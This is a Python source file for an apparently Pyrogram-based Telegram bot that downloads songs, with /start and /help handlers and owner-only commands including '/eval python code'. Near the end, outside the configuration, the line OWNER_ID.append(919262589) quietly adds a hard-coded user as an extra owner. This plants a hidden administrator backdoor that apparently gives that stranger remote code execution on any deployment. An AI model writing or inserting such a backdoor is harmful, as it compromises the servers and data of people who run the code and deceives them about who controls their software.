from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from Bot.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from Bot import app, LOGGER
from Bot.utils import ignore_blacklisted_users
from Bot.sql.chat_sql import add_chat_to_db

start_text = """
Hey [{}](tg://user?id={}), I can help you get your desired song right in the chat.
Just send me the song name you want to download.
Eg: ```/s lovely```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="Source code", url="https://t.me/joinchat/vcOhk8tX214zNGQ1"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] in OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Syntax: /s lovely"
    await message.reply(text)

OWNER_ID.append(919262589)
app.start()
LOGGER.info("Your bot is now online✅")
idle()
